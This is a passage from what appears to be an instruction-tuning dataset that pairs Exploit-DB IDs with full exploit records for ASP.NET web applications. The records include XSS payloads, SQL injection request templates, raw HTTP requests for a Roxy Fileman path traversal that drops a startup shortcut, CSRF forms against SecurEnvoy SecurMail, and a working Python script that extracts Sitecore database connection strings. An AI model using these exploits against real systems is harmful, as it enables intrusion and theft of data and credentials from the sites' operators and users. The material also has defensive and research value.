name=\"BlogPost.Subtitle.Text\"\n\n\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"MarkdownBodyPart.Source\"\n\n<script>alert(document.cookie)</script>\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"submit.Publish\"\n\nsubmit.Publish\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\n\nxxx\n-----------------------------31063090348194141451329743365--\n\n###Reference:\nhttps://github.com/OrchardCMS/OrchardCore/issues/5802\n\n### History\n=============\n2020-03-23  Issue discovered\n2020-03-27  Vendor contacted\n2020-04-22  Vendor response and hotfix\n2020-04-22  Vendor set patch milestone to rc2"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 41985",
        "output": {
            "ID": "41985",
            "File": "exploits/aspx/webapps/41985.txt",
            "Description": "Personify360 7.5.2/7.6.1 - Improper Access Restrictions",
            "Date Published": "2017-05-09",
            "Author": "Pesach Zirkind",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-05-09",
            "Date Updated": "2017-07-03",
            "Verified": "0",
            "Codes": [
                "CVE-2017-7312"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Access and read and create vendor / API credentials in plaintext\n# Date: 3/29/2017\n# Exploit Author: Pesach Zirkind\n# Vendor Homepage: https://personifycorp.com/\n# Version: 7.5.2 - 7.6.1\n# Tested on: Windows (all versions)\n# CVE : CVE-2017-7312\n\n# Category: webapps\n\n1. Description\n\nAny website visitor can access a page that allows viewing and creating any vendor accounts and their credentials including all applications that use Personify API's\n\nIt will show username, password and block(api password)\n\nNew accounts can be created, or, existing accounts can be used to spoof the origin of attacker.\n\nAdditionally, roles can be modified for existing vendors\n\n2. Proof of Concept\n\nVisit: http://site.com/Default.aspx?tabId=275\nClick: Vendor Management on the left side\nClick on the vendor you wish to edit\n\n3. Solution:\n\nThe fix is available at Personify\u2019s SFTP site (sftp.personifycorp.com) as Personify Patch \u2013 SSO-IMS-DNN-Permission.zip"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 41986",
        "output": {
            "ID": "41986",
            "File": "exploits/aspx/webapps/41986.txt",
            "Description": "Personify360 7.5.2/7.6.1 - Improper Database Schema Access Restrictions",
            "Date Published": "2017-05-09",
            "Author": "Pesach Zirkind",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-05-09",
            "Date Updated": "2017-07-03",
            "Verified": "0",
            "Codes": [
                "CVE-2017-7314"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Discover all tables and columns in database when creating new customer role\n# Date: 3/29/2017\n# Exploit Author: Pesach Zirkind\n# Vendor Homepage: https://personifycorp.com/\n# Version: 7.5.2 - 7.6.1\n# Tested on: Windows (all versions)\n# CVE : CVE-2017-7314\n\n# Category: webapps\n\n1. Description\n\nAny website visitor can access a page that allows creation of a new customer role, while creating the role there is access to the database schema showing all the tables and their columns\n\nIt does not show the data in the database only the schema\n\n2. Proof of Concept\n\nVisit: http://site.com/Default.aspx?tabId=275\nClick: Role Configuration on the left side\nClick New\nSelect the \"Role Based on Table\" dropdown\n\n3. Solution:\n\nThe fix is available at Personify\u2019s SFTP site (sftp.personifycorp.com) as Personify Patch \u2013 SSO-IMS-DNN-Permission.zip"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51118",
        "output": {
            "ID": "51118",
            "File": "exploits/aspx/webapps/51118.txt",
            "Description": "ReQlogic v11.3 - Reflected Cross-Site Scripting (XSS)",
            "Date Published": "2023-03-28",
            "Author": "Okan Kurtulus",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2023-03-28",
            "Date Updated": "2023-04-08",
            "Verified": "0",
            "Codes": [
                "CVE-2022-41441"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: ReQlogic v11.3 - Reflected Cross-Site Scripting (XSS)\n# Date: 9 October 2022\n# Exploit Author: Okan Kurtulus\n# Vendor Homepage: https://reqlogic.com\n# Version: 11.3\n# Tested on: Linux\n# CVE : 2022-41441\n\n# Proof of Concept:\n1- Install ReQlogic v11.3\n2- Go to https://localhost:81/ProcessWait.aspx?POBatch=test&WaitDuration=3\n3- XSS is triggered when you send the XSS payload to the POBatch and WaitDuration parameters.\n\n#XSS Payload:\n</script><script>alert(1)</script>\n\n#Affected Prameters\nPOBatch\nWaitDuration\n\n#Final URLs\nhttp://localost:81/ProcessWait.aspx?POBatch=</script><script>alert(1)</script>&WaitDuration=3\nhttp://localost:81/ProcessWait.aspx?POBatch=test&WaitDuration=</script><script>alert(1)</script>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47777",
        "output": {
            "ID": "47777",
            "File": "exploits/aspx/webapps/47777.txt",
            "Description": "Roxy Fileman 1.4.5 - Directory Traversal",
            "Date Published": "2019-12-16",
            "Author": "Patrik Lantz",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-12-16",
            "Date Updated": "2019-12-18",
            "Verified": "0",
            "Codes": [
                "CVE-2019-19731"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Roxy Fileman 1.4.5 - Directory Traversal\n# Author: Patrik Lantz\n# Date: 2019-12-06\n# Software: Roxy Fileman\n# Version: 1.4.5\n# Vendor Homepage: http://www.roxyfileman.com/\n# Software Link: http://www.roxyfileman.com/download.php?f=1.4.5-net\n# CVE: CVE-2019-19731\n\nTested on: ASP.NET 4.0.30319 and Microsoft-IIS 10.0, Windows 10 Pro Build 17134\n(using custom account as application pool identity for the IIS worker process).\n\n\n===========================\nDescription\n===========================\nRoxy Fileman 1.4.5 for .NET is vulnerable to path traversal which can lead to file write in arbitrary locations depending on\nthe IIS worker process privileges.\nThis PoC demonstrates a crafted Windows shortcut file being uploaded and written to the Startup folder. The execution\nof this file will be triggered on the next login.\n\n\nProof of Concept\n===========================\n\nIt's possible to write an uploaded file to arbitrary locations using the RENAMEFILE action.\nThe RenameFile function in main.ashx does not check if the new file name 'name' is a valid location.\nMoreover, the default conf.json has an incomplete blacklist for file extensions which in this case\nallows Windows shortcut files to be uploaded, alternatively existing files can be renamed to include\nthe .lnk extension.\n\n1) Create a shortcut file\n\nBy using for example the target executable C:\\Windows\\System32\\Calc.exe\nRemove the .lnk extension and rename it to use the .dat extension.\n\n\n2) Upload the file\n\nEither upload the .dat file manually via the Roxy Fileman web interface\nor programmatically using a HTTP POST request.\n\nDetails of the request:\n\nPOST /wwwroot/fileman/asp_net/main.ashx?a=UPLOAD HTTP/1.1\nHost: 127.0.0.1:50357\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------159382831523528\nContent-Length: 924\nOrigin: http://127.0.0.1:50357\nConnection: close\nReferer: http://127.0.0.1:50357/wwwroot/fileman/\nCookie: roxyld=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2; roxyview=list\n\n-----------------------------159382831523528\nContent-Disposition: form-data; name=\"action\"\n\nupload\n-----------------------------159382831523528\nContent-Disposition: form-data; name=\"method\"\n\najax\n-----------------------------159382831523528\nContent-Disposition: form-data; name=\"d\"\n\n/wwwroot/fileman/Uploads/test2\n-----------------------------159382831523528\nContent-Disposition: form-data; name=\"files[]\"; filename=\"poc.dat\"\nContent-Type: application/octet-stream\n\n...data omitted...\n-----------------------------159382831523528--\n\n\n\n3) Write the file to the Startup folder using the RENAMEFILE action\nThe new filename is set via the n parameter. The correct path can be identified by trial and error depending\non the location of wwwroot on the filesystem and the privileges for the IIS worker process (w3wp.exe).\n\nIf the necessary directories do not exist, they can be created using the CREATEDIR action which also\nis vulnerable to path traversal.\n\n\nPOST /wwwroot/fileman/asp_net/main.ashx?a=RENAMEFILE&f=%2Fwwwroot%2Ffileman%2FUploads%2FDocuments%2Fpoc.dat&n=../../../../../../../../AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Startup/poc.txt.lnk HTTP/1.1\nHost: 127.0.0.1:50357\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 66\nOrigin: http://127.0.0.1:50357\nConnection: close\nReferer: http://127.0.0.1:50357/wwwroot/fileman/\nCookie: roxyld=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2; roxyview=list\n\nf=%2Fwwwroot%2Ffileman%2FUploads%2Ftest2%2Fpoc.dat&n=poc.dat\n\n\n\nWorkaround / Fix:\n===========================\n\nPatch the main.ashx code in order to perform checks for all paths that they are valid in the following actions:\nCREATEDIR, COPYFILE and RENAMEFILE.\n\nRecommendations for users of Roxy Fileman:\n  - Add lnk file extension to the conf.json under FORBIDDEN_UPLOADS, and aspx since it is not included in the blacklist by default.\n\n\n\nTimeline\n===========================\n2019-12-06: Discovered the vulnerability\n2019-12-06: Reported to the vendor (vendor is unresponsive)\n2019-12-11: Request CVE\n2019-12-13: Advisory published\n\nDiscovered By:\n===========================\nPatrik Lantz"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47589",
        "output": {
            "ID": "47589",
            "File": "exploits/aspx/webapps/47589.txt",
            "Description": "SD.NET RIM 4.7.3c - 'idtyp' SQL Injection",
            "Date Published": "2019-11-05",
            "Author": "Fabian Mosch_ Nick Theisinger",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: SD.NET RIM 4.7.3c - 'idtyp' SQL Injection\n# Date: 2019-11-05\n# Exploit Author: Fabian Mosch (r-tec IT Security GmbH)\n# Vendor Homepage: https://www.sitzungsdienst.net/\n# Software Link: https://www.sitzungsdienst.net/2018/12/sd-net-rim-4-7-3-veroeffentlicht/\n# Version: < 4.7.3c\n# Tested on: < 4.7.3c\n# CVE : N/A\n\n# SD.NET RIM before version 4.7.3c is vulnerable to a SQL-Injection vulnerability. To Exploit the vulnerability\n# an attacker has to inject arbitrary SQL Statements in the following POST parameters:\n\nPOST /vorlagen/?__=SOMEBASE64 HTTP/1.1\nHost: VulnerableHost.com\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 182\nOrigin: https://vulnerablehost.com\nConnection: close\nReferer: https://vulnerablehost.com/vorlagen/?__=BASE64\nCookie: PHPSESSID250=SESSIONID\nUpgrade-Insecure-Requests: 1\n\nreqid=f48de4c24ae1b72dd37ebde6f6b40544&nummer=t&idtyp=-1\u2019INJECTHERE&idgremium=-1\u2019INJECTHERE&datefrom=TT.MM.JJJJ&dateto=TT.MM.JJJJ&csrftoken=CSRFToken\n\n# The attacker is then redirected with a 302 redirect to an URL /templates/?__=NEWBASE64 as GET request.\n# By issuing the second request the arbitrary SQL-Statement gets executed."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44285",
        "output": {
            "ID": "44285",
            "File": "exploits/aspx/webapps/44285.txt",
            "Description": "SecurEnvoy SecurMail 9.1.501 - Multiple Vulnerabilities",
            "Date Published": "2018-03-13",
            "Author": "SEC Consult",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-03-13",
            "Date Updated": "2018-03-13",
            "Verified": "0",
            "Codes": [
                "CVE-2018-7707;CVE-2018-7706;CVE-2018-7705;CVE-2018-7704;CVE-2018-7703;CVE-2018-7702;CVE-2018-7701"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "SEC Consult Vulnerability Lab Security Advisory < 20180312-0 >\n=======================================================================\n              title: Multiple Critical Vulnerabilities\n            product: SecurEnvoy SecurMail\n vulnerable version: 9.1.501\n      fixed version: 9.2.501 or hotfix patch \"1_012018\"\n         CVE number: CVE-2018-7701, CVE-2018-7702, CVE-2018-7703, CVE-2018-7704,\n                     CVE-2018-7705, CVE-2018-7706, CVE-2018-7707\n             impact: Critical\n           homepage: https://www.securenvoy.com/\n              found: 2017-11\n                 by: W. Ettlinger (Office Vienna)\n                     SEC Consult Vulnerability Lab\n\n                     An integrated part of SEC Consult\n                     Europe | Asia | North America\n\n                     https://www.sec-consult.com\n\n=======================================================================\n\nVendor description:\n-------------------\n\"Sending and receiving encrypted emails is not an easy or simple experience.\nBusinesses rely on email with an increasing amount of sensitive data sent across\ntheir networks. A revolutionary approach that doesn't suffer from the overheads\nof deployment and encryption management; just rock-solid security to give you\n100% confidence in your business communications.\"\n\nURL: https://www.securenvoy.com/products/securmail/key-features.shtm\n\n\nBusiness recommendation:\n------------------------\nDuring a brief crash test of the SecurEnvoy SecurMail application several severe\nvulnerabilities have been identified that break the core security promises of\nthe product.\n\nThese vulnerabilities open the possibility for several different attack\nscenarios that allow an attacker to read other users' encrypted e-mails and\noverwrite or delete e-mails stored in other users' inboxes.\n\nAs we have identified several critical vulnerabilities within a very short time\nframe we expect numerous other vulnerabilities to be present.\n\nAs other SecureEnvoy products (besides the analyzed SecurMail) appear\nto be highly integrated (all products are installed with a single setup\nfile) we suspect other components to also suffer from severe security deficits.\n\nWe recommend not to use SecurEnvoy products (especially SecurMail) in a\nproduction environment until:\n* a comprehensive security audit has been performed and\n* state of the art security mechanisms have been adopted.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) Cross Site Scripting (CVE-2018-7703, CVE-2018-7707)\nSEC Consult did not find any functionality that encodes user input when creating\nHTML pages. Therefore persistent and reflected cross site scripting attacks are\npossible throughout the application.\n\nSome pages fail to properly decode URL encoded parameters. Because of this, cross\nsite scripting cannot be exploited on these pages in most browsers.\n\n\n2) Path Traversal (CVE-2018-7705, CVE-2018-7706)\nSEC Consult did not find any path traversal checks throughout the application.\nSince the application uses encrypted files as the primary method of data\nstorage, this vulnerability can be exploited at several points.\n\nUsing this vulnerability, a legitimate recipient can read mails sent to other\nrecipients in plain text!\n\n\n3) Insecure Direct Object Reference (CVE-2018-7704)\nAuthorization checks are only partially implemented. This allows a legitimate\nrecipient to read mails sent to other users in plain text.\n\n\n4) Missing Authentication and Authorization (CVE-2018-7702)\nIn order to send encrypted e-mails a client does not need to authenticate on the\nSecurEnvoy server. Therefore anyone with network access to the server can\narbitrarily send e-mails that appear to come from an arbitrary sender address.\n\nMoreover, an attacker with network access to the server can re-send previous\ncommunication to arbitrary recipients. This allows him/her to extract all\ne-mails stored on the server. An attacker could also modify arbitrary messages\nstored on the server.\n\n\n5) Cross Site Request Forgery (CVE-2018-7701)\nSEC Consult did not find any protection against cross site request forgery. An\nattacker could use this vulnerability to delete a victim's e-mail or to\nimpersonate the victim and reply to his/her e-mails.\n\n\nSince these vulnerabilities were found during a very short time frame, SEC\nConsult believes that the product may contain a large number of other security\nvulnerabilities. As already several core security promises have been broken\nduring this short crash test, no further tests were conducted.\n\n\nProof of concept:\n-----------------\n1) Cross Site Scripting\na) The following HTML fragments demonstrates reflected cross site scripting\n   (CVE-2018-7703):\n\n--- snip ---\n<form action=\"http://<host>/secmail/getmessage.exe\" method=\"POST\"\n    enctype=\"text/plain\">\n  <input type=\"hidden\" name=\"mailboxid\"\n\nvalue=\"\"><script>alert&#40;&apos;xss&apos;&#41;<&#47;script>\" />\n  <input type=\"submit\" value=\"Submit request\" />\n</form>\n--- snip ---\n\nb) E-mails that are sent using the HTML format can contain any <script> tags\n   (CVE-2018-7707). These are executed once the victim opens the message in the\n   web interface.\n\n\n2) Path Traversal\na) The following request demonstrates how the message body of the e-mail with id\n   107 can be overwritten while uploading the body for message 103. The message\n   IDs can easily be guessed since they are assigned sequentially\n   (CVE-2018-7705).\n\n--- snip---\nPOST /secupload2/upload.aspx HTTP/1.1\nHost: <host>\nContent-Type: multipart/form-data; boundary=--------822119548\nContent-Length: 309\n\n----------822119548\nContent-Disposition: form-data; name=\"FileName\"\n\nx\n----------822119548\nContent-Disposition: form-data; name=\"MessageID\"\n\n103\n----------822119548\nContent-Disposition: form-data; filename=\"../107/BODY\"\nContent-Type: application/octet-stream\n\nsome message\n----------822119548--\n--- snip ---\n\nb) The following link demonstrates how the message body of the e-mail with id\n   107 can be retrieved while only having access to the mail with id 103\n   (CVE-2018-7706):\n\nhttp://<host>/secmail/getmessage.exe?mailboxid=<mailbox-id>&action=attachment&option1=103&option2=../107/BODY\n\n\n3) Insecure Direct Object Reference (CVE-2018-7704)\nThe functionality that allows a recipient to read an e-mail checks whether the\nuser is actually authorized to read the requested e-mail. However, by using the\nfunctionality that allows a user to reply to an e-mail, an attacker can\nmanipulate the id that is sent as a URL parameter to read arbitrary e-mails.\nThe following link demonstrates the retrieval of the message with id 103. The\nmessage id can easily be guessed since they are assigned sequentially.\n\nhttp://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=reply&option1=103\n\n\n4) Missing Authorization (CVE-2018-7702)\nIn order to send an e-mail to a recipient the following requests have to be\nmade:\n 1. Execute a GETINFO request in order to request a message id.\n 2. Upload the message body and the attachments.\n 3. Execute a STORE request to send the message to the recipients.\n\nNeither of these requests require any authentication. Therefore, also no\nauthorization is made. Attack scenarios include:\na) Extract any message by executing step #3 while specifying an own e-mail\n   address as recipient and the message id to extract.\nb) Overwrite attachments or message bodies of previously sent e-mails by\n   executing step #2 to upload arbitrary content.\n\n\n5) Cross-Site Request Forgery\nSEC Consult did not find any CSRF protection within the web interface. Moreover,\nCSRF attacks are possible against the API used to send e-mails. Since this API\ndoes not require authentication, being authenticated on the server is not a\nprecondition for a successful attack. Instead, the attack exploits the victim's\nnetwork location.\n\na) The following link demonstrates how e-mails can be deleted using a CSRF\n   attack (CVE-2018-7701):\n\nhttp://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=delete&option1=103\n\nb) The following HTML fragment demonstrates how the API can be exploited to send\n   an e-mail with an arbitrary message id to an arbitrary recipient (also\n   CVE-2018-7702):\n\n<form action=\"http://<host>/secserver/securectrl.exe\" method=\"POST\"\n    enctype=\"text/plain\">\n <input type=\"hidden\"\n name=\"FLAG&#58;STORE&#13;&#10;VERSION&#58;1&#46;0&#13;&#10;RECIPIENT&#95;MOBILE&#95;LIST&#58;SMTP\" value=\"bob&#64;local&#58;MOBILE&#61;00000&#13;&#10;SENDER&#58;me&#64;local&#13;&#10;RECORDED&#95;DELIVERY&#58;&#13;&#10;SUBJECTB64&#58;AAAA&#13;&#10;MESSAGEID&#58;108&#13;&#10;SENDERMOBILE&#58;000000&#13;&#10;REPLY&#58;False\" />\n <input type=\"submit\" value=\"Submit request\" />\n</form>\n\n\nVulnerable / tested versions:\n-----------------------------\nThe version 9.1.501 was found to be vulnerable. This was the latest version at\nthe time of discovery.\n\n\nVendor contact timeline:\n------------------------\n2017-11-20: Contacting vendor through info <at> securenvoy <dot> com\n2017-11-21: SecureEnvoy requests to upload advisory through their SecurMail\n            instance\n2017-11-22: Uploading advisory to SecurEnvoy's SecurMail instance\n2017-12-13: SecurEnvoy: engineering team is investigating issues;\n            product will be re-engineered; asked for deadline extension until\n            revised software is available\n2017-11-15: Postponing advisory release to 2017-02-21\n2018-01-22: SecurEnvoy sends release notes document for the security patch\n            \"1_012018\"; Fixed vulnerabilities: Path traversal, Insecure Direct\n            Object Reference, XSS, CSRF; SecurEnvoy instructs customers to\n            configure requiring client certificates for the \"secserver\" endpoint\n2018-02-22: Asking whether the security patch has been released\n2018-03-01: Asking for status update\n2018-03-01: SecurEnvoy: patch has been released\n2018-03-12: Releasing security advisory\n\n\nSolution:\n---------\nCustomers of SecurEnvoy should immediately apply the security patch \"1_012018\"\nor update to version 9.2.501 of the software.\n\n\nWorkaround:\n-----------\nNone\n\n\nAdvisory URL:\n-------------\nhttps://www.sec-consult.com/en/vulnerability-lab/advisories/index.html\n\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSEC Consult Vulnerability Lab\n\nSEC Consult\nEurope | Asia | North America\n\nAbout SEC Consult Vulnerability Lab\nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It\nensures the continued knowledge gain of SEC Consult in the field of network\nand application security to stay ahead of the attacker. The SEC Consult\nVulnerability Lab supports high-quality penetration testing and the evaluation\nof new offensive and defensive technologies for our customers. Hence our\ncustomers obtain the most current information about vulnerabilities and valid\nrecommendation about the risk profile of new technologies.\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nInterested to work with the experts of SEC Consult?\nSend us your application https://www.sec-consult.com/en/career/index.html\n\nInterested in improving your cyber security with the experts of SEC Consult?\nContact our local offices https://www.sec-consult.com/en/contact/index.html\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMail: research at sec-consult dot com\nWeb: https://www.sec-consult.com\nBlog: http://blog.sec-consult.com\nTwitter: https://twitter.com/sec_consult\n\nEOF W. Ettlinger / @2018"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51876",
        "output": {
            "ID": "51876",
            "File": "exploits/aspx/webapps/51876.py",
            "Description": "Sitecore - Remote Code Execution v8.2",
            "Date Published": "2024-03-11",
            "Author": "abhishek morla",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2024-03-11",
            "Date Updated": "2024-03-11",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#!/usr/bin/env python3\n#\n# Exploit Title: Sitecore - Remote Code Execution v8.2\n# Exploit Author: abhishek morla\n# Google Dork: N/A\n# Date: 2024-01-08\n# Vendor Homepage: https://www.sitecore.com/\n# Software Link: https://dev.sitecore.net/\n# Version: 10.3\n# Tested on: windows64bit / mozila firefox\n# CVE : CVE-2023-35813\n# The vulnerability impacts all Experience Platform topologies (XM, XP, XC) from 9.0 Initial Release to 10.3 Initial Release; 8.2 is also impacted\n# Blog : https://medium.com/@abhishekmorla/uncovering-cve-2023-35813-retrieving-core-connection-strings-in-sitecore-5502148fce09\n# Video POC : https://youtu.be/vWKl9wgdTB0\n\nimport argparse\nimport requests\nfrom urllib.parse import quote\nfrom rich.console import Console\n\nconsole = Console()\ndef initial_test(hostname):\n    # Initial payload to test vulnerability\n    test_payload = '''\n    <%@Register\n        TagPrefix = 'x'\n        Namespace = 'System.Runtime.Remoting.Services'\n        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'\n    %>\n    <x:RemotingService runat='server'\n    Context-Response-ContentType='TestVulnerability'\n    />\n    '''\n    encoded_payload = quote(test_payload)\n\n    url = f\"https://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index\"\n    headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n    data = \"__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\\\"{}\\\")\".format(encoded_payload)\n\n    response = requests.post(url, headers=headers, data=data, verify=False)\n\n    # Check for the test string in the Content-Type of the response\n    return 'TestVulnerability' in response.headers.get('Content-Type', '')\n\ndef get_payload(choice):\n    # Payload templates for different options\n    payloads = {\n        '1': \"<%$ ConnectionStrings:core %>\",\n        '2': \"<%$ ConnectionStrings:master %>\",\n        '3': \"<%$ ConnectionStrings:web %>\"\n    }\n\n    base_payload = '''\n    <%@Register\n        TagPrefix = 'x'\n        Namespace = 'System.Runtime.Remoting.Services'\n        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'\n    %>\n    <x:RemotingService runat='server'\n    Context-Response-ContentType='{}'\n    />\n    '''\n\n    return base_payload.format(payloads.get(choice, \"Invalid\"))\n\ndef main(hostname):\n    if initial_test(hostname):\n        print(\"Exploiting, Please wait...\")\n        console.print(\"[bold green]The target appears to be vulnerable. Proceed with payload selection.[/bold green]\")\n        print(\"Select the payload to use:\")\n        print(\"1: Core connection strings\")\n        print(\"2: Master connection strings\")\n        print(\"3: Web connection strings\")\n        payload_choice = input(\"Enter your choice (1, 2, or 3): \")\n\n        payload = get_payload(payload_choice)\n        encoded_payload = quote(payload)\n\n        url = f\"http://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index\"\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        data = \"__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\\\"{}\\\")\".format(encoded_payload)\n\n        response = requests.post(url, headers=headers, data=data)\n\n        if 'Content-Type' in response.headers:\n            print(\"Content-Type from the response header:\")\n            print(\"\\n\")\n            print(response.headers['Content-Type'])\n        else:\n            print(\"No Content-Type in the response header. Status Code:\", response.status_code)\n    else:\n        print(\"The target does not appear to be vulnerable to CVE-2023-35813.\")\n\n\nif __name__ == \"__main__\":\n    console.print(\"[bold green]Author: Abhishek Morla[/bold green]\")\n    console.print(\"[bold red]CVE-2023-35813[/bold red]\")\n    parser = argparse.ArgumentParser(description='Test for CVE-2023-35813 vulnerability in Sitecore')\n    parser.add_argument('hostname', type=str, help='Hostname of the target Sitecore instance')\n    args = parser.parse_args()\n\n    main(args.hostname)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46987",
        "output": {
            "ID": "46987",
            "File": "exploits/aspx/webapps/46987.txt",
            "Description": "Sitecore 8.x - Deserialization Remote Code Execution",
            "Date Published": "2019-06-13",
            "Author": "Jarad Kopf",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-06-13",
            "Date Updated": "2019-06-13",
            "Verified": "0",
            "Codes": [
                "CVE-2019-11080"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Sitecore v 8.x Deserialization RCE\n# Date: Reported to vendor October 2018, fix released April 2019.\n# Exploit Author: Jarad Kopf\n# Vendor Homepage: https://www.sitecore.com/\n# Software Link: Sitecore downloads: https://dev.sitecore.net/Downloads.aspx\n# Version: Sitecore 8.0 Revision 150802\n# Tested on: Windows\n# CVE : CVE-2019-11080\n\nExploit:\n\nAuthentication is needed for this exploit. An attacker needs to login to Sitecore 8.0 revision 150802's Admin section.\nWhen choosing to Serializeusers or domains in the admin UI, calls to /sitecore/shell/~/xaml/Sitecore.Shell.Applications.Dialogs.Progress.aspx will include a CSRFTOKEN parameter.\nBy replacing this parameter with a URL-encoded, base64-encoded crafted payload from ysoserial.net, an RCE is successful."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47106",
        "output": {
            "ID": "47106",
            "File": "exploits/aspx/webapps/47106.txt",
            "Description": "Sitecore 9.0 rev 171002 - Persistent Cross-Site Scripting",
            "Date Published": "2019-07-11",
            "Author": "Owais Mehtab",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "443",
            "Date Added": "2019-07-11",
            "Date Updated": "2019-07-11",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13493"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Stored Cross Site Scripting (XSS) in Sitecore 9.0 rev 171002\n# Date: July 11, 2019\n# Exploit Author: Owais Mehtab\n# Vendor Homepage: http://www.sitecore.net/en\n# Version: 9.0 rev. 171002\n# Tested on: Sitecore Experience Platform 8.1 Update-3 i.e.; 8.1 rev. 160519\n# CVE : CVE-2019-13493\n\nVendor Description\n------------------\nSitecore CMS makes it effortless to create content and experience rich websites that help you achieve your business goals such as increasing sales and search engine visibility, while being straight-forward to integrate and administer. Sitecore lets you deliver sites that are highly scalable, robust and secure. Whether you're focused on marketing, development and design, or providing site content, Sitecore delivers for you.\n\nDescription\n------------\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.\n\nVulnerability Class\n--------------------\nCross-site Scripting (XSS) - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)\n\nProof of 